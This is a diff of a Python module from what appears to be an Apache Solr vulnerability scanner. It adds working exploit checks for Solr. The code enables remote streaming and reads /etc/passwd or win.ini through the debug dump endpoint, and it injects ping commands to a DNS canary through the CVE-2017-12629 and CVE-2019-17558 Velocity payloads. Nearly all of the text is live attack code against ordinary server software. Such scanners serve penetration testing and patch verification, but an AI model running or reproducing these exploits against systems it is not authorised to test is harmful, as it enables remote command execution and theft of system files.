@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import json
-import requests
+from thirdparty import requests
+from thirdparty.requests.compat import urljoin
 import threading
 import http.client
 from core.verify import verify
 from module.md5 import random_md5
 from module import globals
 from urllib.parse import urlparse, quote
-from requests_toolbelt.utils import dump
-from requests.packages import urllib3
-urllib3.disable_warnings()
+from thirdparty.requests_toolbelt.utils import dump
+from module.api.dns import dns_result, dns_request
 
 
 class ApacheSolr:
@@ -22,11 +22,10 @@ class ApacheSolr:
         self.ua = globals.get_value("UA")  # 获取全局变量UA
         self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
         self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
-        self.ceye_domain = globals.get_value("ceye_domain")
-        self.ceye_token = globals.get_value("ceye_token")
-        self.ceye_api = globals.get_value("ceye_api")
         self.threadLock = threading.Lock()
         # Change the url format to conform to the program
+        if self.url[-1] == "/":
+            self.url = self.url[:-1]
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
@@ -77,8 +76,8 @@ class ApacheSolr:
         self.vul_info["cre_auth"] = "zhzyker"
         core_name = "null"
         new_core = random_md5()
-        md = random_md5()
-        cmd = "ping " + md + "." + self.ceye_domain
+        md = dns_request()
+        cmd = "ping " + md
         payload1 = self.payload_cve_2017_12629.replace("RECOMMAND", cmd).replace("new_core", new_core)
         payload2 = '[{"id": "test"}]'
         url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
@@ -102,23 +101,16 @@ class ApacheSolr:
                 pass
             req = requests.post(self.url + "/solr/" + str(core_name) + "/config", data=payload1, headers=headers_solr1,
                                 timeout=self.timeout, verify=False)
-            if r"xxxxxx" in self.ceye_domain:  # 特征判断
+            if dns_result(md):
+                self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
+                self.vul_info["prt_resu"] = "PoCSuCCeSS"
+                self.vul_info["prt_info"] = "[dns] [new core:" + new_core + "] "
+            else:
                 if request.status_code == 200 and core_name != "null" and core_name is not None:
                     self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                     self.vul_info["prt_resu"] = "PoC_MaYbE"
                     self.vul_info["prt_info"] = "[maybe] [new core:" + new_core + "] "
-                    verify.scan_print(self.vul_info)
-            else:
-                request = requests.post(self.url + "/solr/" + str(core_name) + "/update", data=payload2,
-                                        headers=headers_solr2, timeout=self.timeout, verify=False)
-                request = requests.get(self.ceye_api + self.ceye_token)
-                if md in request.text:
-                    self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
-                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                    self.vul_info["prt_info"] = "[ceye] [new core:" + new_core + "] "
-                    verify.scan_print(self.vul_info)
-                else:
-                    verify.scan_print(self.vul_info)
+            verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
         except requests.exceptions.ConnectionError:
@@ -235,7 +227,7 @@ class ApacheSolr:
         self.vul_info["vul_urls"] = self.url
         self.vul_info["vul_payd"] = self.payload_cve_2019_17558.replace("RECOMMAND", "whoami")
         self.vul_info["vul_name"] = "Apache Solr Velocity template Remote Code Execution"
-        self.vul_info["vul_numb"] = "CVE-2018-17558"
+        self.vul_info["vul_numb"] = "CVE-2019-17558"
         self.vul_info["vul_apps"] = "Solr"
         self.vul_info["vul_date"] = "2017-10-16"
         self.vul_info["vul_vers"] = "5.0.0 - 8.3.1"
@@ -245,8 +237,8 @@ class ApacheSolr:
         self.vul_info["vul_desc"] = "用户可以注入自定义模板，通过Velocity模板语言执行任意命令。"
         self.vul_info["cre_auth"] = "zhzyker"
         core_name = None
-        md = random_md5()
-        cmd = "ping " + md + "." + self.ceye_domain
+        md = dns_request()
+        cmd = "ping " + md
         payload_2 = self.payload_cve_2019_17558.replace("RECOMMAND", cmd)
         url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
         try:
@@ -269,23 +261,95 @@ class ApacheSolr:
               }
             }
             """
-            r = requests.post(url_api, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
-            req = requests.get(self.url + "/solr/" + str(core_name) + payload_2, headers=self.headers,
-                               timeout=self.timeout, verify=False)
-            request = requests.get(self.ceye_api + self.ceye_token)
-
-            if md in request.text:
-                self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
+            try:
+                r = requests.post(url_api, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
+                req = requests.get(self.url + "/solr/" + str(core_name) + payload_2, headers=self.headers,
+                                   timeout=self.timeout, verify=False)
+                req = dump.dump_all(req).decode('utf-8', 'ignore')
+                r = dump.dump_all(r).decode('utf-8', 'ignore')
+            except:
+                req = "timeout"
+                r = "timeout"
+            if dns_result(md):
+                self.vul_info["vul_data"] = req
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["prt_info"] = "[corename: " + self.url + "/solr/" + core_name + " ]"
+                self.vul_info["prt_info"] = "[dns] [corename: " + self.url + "/solr/" + core_name + " ]"
                 verify.scan_print(self.vul_info)
-            elif self.vul_info["prt_resu"] != "PoCSuCCeSS" and r.status_code == 200 and core_name is not None:
-                self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
+            elif self.vul_info["prt_resu"] != "PoCSuCCeSS" and core_name is not None:
+                self.vul_info["vul_data"] = r
                 self.vul_info["prt_resu"] = "PoC_MaYbE"
                 self.vul_info["prt_info"] = "[maybe] [corename: " + self.url + "/solr/" + core_name + " ]"
                 verify.scan_print(self.vul_info)
             else:
                 verify.scan_print(self.vul_info)
+        except requests.exceptions.Timeout:
+            verify.timeout_print(self.vul_info["prt_name"])
+        except requests.exceptions.ConnectionError:
+            verify.connection_print(self.vul_info["prt_name"])
+        except Exception as e:
+            verify.error_print(self.vul_info["prt_name"])
+        self.threadLock.release()
+
+    def time_2021_0318_poc(self):
+        self.threadLock.acquire()
+        self.vul_info["prt_name"] = "Apache Solr: time-2021-03-18"
+        self.vul_info["prt_resu"] = "null"
+        self.vul_info["prt_info"] = "null"
+        self.vul_info["vul_urls"] = self.url
+        self.vul_info["vul_payd"] = ""
+        self.vul_info["vul_name"] = "Apache Solr Arbitrary file reading"
+        self.vul_info["vul_numb"] = "time-2021-03-18"
+        self.vul_info["vul_apps"] = "Solr"
+        self.vul_info["vul_date"] = "2021-03-17"
+        self.vul_info["vul_vers"] = "all"
+        self.vul_info["vul_risk"] = "high"
+        self.vul_info["vul_type"] = "Arbitrary file read"
+        self.vul_info["vul_data"] = "null"
+        self.vul_info["vul_desc"] = "Arbitrary file read"
+        self.vul_info["cre_auth"] = "zhzyker"
+        core_name = None
+        url_core = self.url + "/solr/admin/cores?indexInfo=false&wt=json"
+        try:
+            request = requests.get(url_core, headers=self.headers, timeout=self.timeout, verify=False)
+            try:
+                core_name = list(json.loads(request.text)["status"])[0]
+            except:
+                pass
+            set_property = self.url + "/solr/" + str(core_name) + "/config"
+            headers_json = {'Content-Type': 'application/json', 'Connection': 'colse', 'User-Agent': self.ua}
+            data = r'''{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'''
+            r = requests.post(set_property, data=data, headers=headers_json, timeout=self.timeout, verify=False)
+            if r.status_code == 200 and r"responseHeader" in r.text:
+                rce_url = self.url + "/solr/" + str(core_name) + "/debug/dump?param=ContentStreams"
+                headers = {
+                    'User-Agent': self.ua,
+                    'Connection': 'colse',
+                    'Content-Type': 'multipart/form-data; boundary=------------------------e602c3e1a193d599'
+                }
+                data = '--------------------------e602c3e1a193d599\r\n'
+                data += 'Content-Disposition: form-data; name="stream.url"\r\n'
+                data += '\r\n'
+                data += 'file:///etc/passwd\r\n'
+                data += '--------------------------e602c3e1a193d599--\r\n'
+                req = requests.post(rce_url, data=data, headers=headers, timeout=self.timeout, verify=False)
+                if r"root:x:0:0:root" in req.text and r"/root:/bin/bash" in req.text and r"/usr/sbin/nologin" in req.text:
+                    if r"daemon:" in req.text and req.status_code == 200:
+                        self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
+                        self.vul_info["prt_resu"] = "PoCSuCCeSS"
+                        self.vul_info["prt_info"] = "[file read] [os:linux] [corename: " + self.url + "/solr/" + core_name + " ]"
+                else:
+                    data = '--------------------------e602c3e1a193d599\r\n'
+                    data += 'Content-Disposition: form-data; name="stream.url"\r\n'
+                    data += '\r\n'
+                    data += 'file:///C:windows/win.ini\r\n'
+                    data += '--------------------------e602c3e1a193d599--\r\n'
+                    req = requests.post(rce_url, data=data, headers=headers, timeout=self.timeout, verify=False)
+                    if r"app support" in req.text and r"fonts" in req.text and r"mci extensions" in req.text:
+                        if r"files" in req.text and req.status_code == 200:
+                            self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
+                            self.vul_info["prt_resu"] = "PoCSuCCeSS"
+                            self.vul_info["prt_info"] = "[file read] [os:windows] [corename: " + self.url + "/solr/" + core_name + " ]"
+            verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
         except requests.exceptions.ConnectionError:
